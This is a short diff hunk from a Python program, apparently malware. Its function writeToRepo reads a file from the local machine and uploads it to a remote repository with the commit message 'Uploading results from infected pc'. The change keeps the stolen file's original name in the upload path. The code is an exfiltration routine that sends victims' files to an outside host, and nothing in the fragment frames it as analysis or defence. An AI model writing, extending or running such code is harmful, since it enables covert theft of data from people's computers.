@@ -26,7 +26,7 @@ def writeToRepo(file, hostname):
     content = readFile(file)
     time = datetime.now().strftime("%Y%m%d%H%M%S")
 
-    pad = f"result/{hostname}-{time}.txt"
+    pad = f"result/{hostname}-{time}-{file}"
     repo.create_file(
         pad,
         f"Uploading results from infected pc: {hostname}",
